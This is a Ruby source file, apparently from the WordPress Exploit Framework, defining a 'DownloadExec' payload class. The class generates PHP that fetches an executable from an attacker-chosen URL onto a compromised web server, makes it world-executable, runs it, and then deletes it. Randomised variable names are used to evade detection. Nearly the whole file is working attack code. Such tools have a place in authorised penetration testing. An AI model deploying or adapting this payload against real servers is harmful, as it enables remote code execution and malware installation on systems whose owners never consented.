require 'base64'

module Wpxf::Payloads
  # Downloads an executable and runs it in the context of the web server.
  class DownloadExec < Wpxf::Payload
    include Wpxf

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'executable_url',
          required: true,
          desc: 'The URL to download the executable file from'
        )
      ])
    end

    def executable_url
      datastore['executable_url']
    end

    def generate_php_vars
      generate_vars([
        :cmd, :disabled, :handle, :output, :pipes, :fp,
        :tempfile, :fname, :fd_in, :fd_out
      ])
    end

    def raw
      php_vars = generate_php_vars
      exename = Utility::Text.rand_alpha(rand(5..10))
      <<-END_OF_PHP_CODE
        #{php_preamble(php_vars)}

        if (!function_exists('sys_get_temp_dir')) {
        function sys_get_temp_dir() {
          if (!empty($_ENV['TMP'])) { return realpath($_ENV['TMP']); }
          if (!empty($_ENV['TMPDIR'])) { return realpath($_ENV['TMPDIR']); }
          if (!empty($_ENV['TEMP'])) { return realpath($_ENV['TEMP']); }
          $#{php_vars[:tempfile]}=tempnam(uniqid(rand(),TRUE),'');
          if (file_exists($#{php_vars[:tempfile]})) {
            @unlink($#{php_vars[:tempfile]});
            return realpath(dirname($#{php_vars[:tempfile]}));
          }
          return null;
        }
      }
      $#{php_vars[:fname]} = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "#{exename}.exe";
      $#{php_vars[:fd_in]} = fopen("#{executable_url}", "rb");
      $#{php_vars[:fd_out]} = fopen($#{php_vars[:fname]}, "wb");
      while (!feof($#{php_vars[:fd_in]})) {
        fwrite($#{php_vars[:fd_out]}, fread($#{php_vars[:fd_in]}, 8192));
      }
      fclose($#{php_vars[:fd_in]});
      fclose($#{php_vars[:fd_out]});
      chmod($#{php_vars[:fname]}, 0777);
      $#{php_vars[:cmd]} = $#{php_vars[:fname]};

      #{exec_methods(php_vars)}
      {
        $#{php_vars[:output]} = 0;
      }

      @unlink($#{php_vars[:fname]});
      echo $#{php_vars[:output]};
      END_OF_PHP_CODE
    end
  end
end
